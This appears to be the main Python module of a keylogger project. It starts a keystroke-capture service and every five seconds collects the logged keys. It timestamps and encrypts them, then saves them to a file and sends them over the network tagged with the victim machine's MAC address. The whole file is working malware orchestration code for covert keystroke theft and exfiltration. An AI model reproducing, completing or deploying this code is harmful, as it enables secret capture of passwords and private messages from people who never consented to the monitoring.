from encryption.encryption import Encryption
from keylogger.new_keylogger import KeyloggerService
from writer.FileWriter import FileWriter
from writer.NetWorkWriter import NetWorkWriter
from time import sleep
from datetime import datetime
import uuid

class KeyLoggerManager:
    def __init__(self):
        self.mac_address = hex(uuid.getnode())
        self.file_writer = FileWriter()
        self.netWork_writer = NetWorkWriter()
        self.keylogger = KeyloggerService()
        self.encoder = Encryption(open('key.txt', 'r').read())
        self.flag = True

    def start(self):
        try:
            self.keylogger.start_logging()
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            self.flag = False


    def handle_logging(self):
        while self.flag:
            logged_keys = "".join(self.keylogger.get_logged_keys())
            if logged_keys:
                logged_keys = datetime.now().strftime('*****%H:%M:%S %d/%m/%Y*****/n') + logged_keys + '/n' * 2
                try:
                    if "<ESC>" in logged_keys:
                        self.keylogger.stop_logging()
                        self.flag = False
                        return
                    encrypted_data = self.encoder.encryption(logged_keys)
                    self.file_writer.send_data(encrypted_data, self.mac_address)
                    self.netWork_writer.send_data(encrypted_data, self.mac_address)

                except Exception as e:
                    print(e)
                    return
            sleep(5)


def main():
    key_logger = KeyLoggerManager()
    key_logger.start()
    key_logger.handle_logging()



if __name__ == "__main__":
    main()

